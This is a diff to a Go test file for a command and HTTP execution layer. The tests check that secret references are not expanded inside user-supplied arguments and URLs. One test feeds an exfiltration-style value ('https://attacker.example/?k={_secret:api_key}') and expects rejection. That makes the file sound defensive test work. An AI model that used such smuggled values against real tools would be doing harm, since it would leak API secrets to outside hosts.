@@ -823,7 +823,9 @@ func TestExecuteExecArray(t *testing.T) {
 	if strings.TrimSpace(raw) != "hello there" {
 		t.Errorf("raw_output = %q", raw)
 	}
-	if env.Command != "echo 'hello there'" {
+	// The executed envelope carries the declared command, not the resolved
+	// argv (the dry run keeps that).
+	if env.Command != "echo {msg}" {
 		t.Errorf("envelope command = %q", env.Command)
 	}
 }
@@ -1051,7 +1053,7 @@ func TestHTTPSecretsExpandBeforeArgs(t *testing.T) {
 		},
 		Http: &manifest.HttpDef{
 			Method: "POST",
-			URL:    "{target}",
+			URL:    "https://api.example.com/fetch?u={target}",
 			Headers: map[string]string{
 				"Authorization": "Bearer {_secret:api_key}",
 				"X-Echo":        "{target}",
@@ -1072,8 +1074,10 @@ func TestHTTPSecretsExpandBeforeArgs(t *testing.T) {
 	if strings.Contains(built, secret) {
 		t.Errorf("secret leaked into URL: %q", built)
 	}
-	if !strings.Contains(req.URL.RawQuery, "_secret:api_key") {
-		t.Errorf("argument text must survive literally in the URL, got %q", built)
+	// The argument text survives literally (percent-encoded as one query
+	// value), so its secret reference is never expanded.
+	if got := req.URL.Query().Get("u"); got != smuggled {
+		t.Errorf("argument text must survive literally in the URL, got %q", got)
 	}
 	if got := req.Header.Get("X-Echo"); got != smuggled {
 		t.Errorf("header from argument must stay literal: got %q", got)
@@ -1104,7 +1108,7 @@ func TestExecuteHTTPRejectsSecretInURLArg(t *testing.T) {
 			// manifest; the metacharacter check still fires first.
 			"target": {Name: "target", Type: "url", Required: true, BlockInternal: true},
 		},
-		Http: &manifest.HttpDef{Method: "GET", URL: "{target}"},
+		Http: &manifest.HttpDef{Method: "GET", URL: "https://api.example.com/fetch?u={target}"},
 	}
 	_, err := ExecuteHTTP(m, map[string]string{"target": "https://attacker.example/?k={_secret:api_key}"})
 	if err == nil {
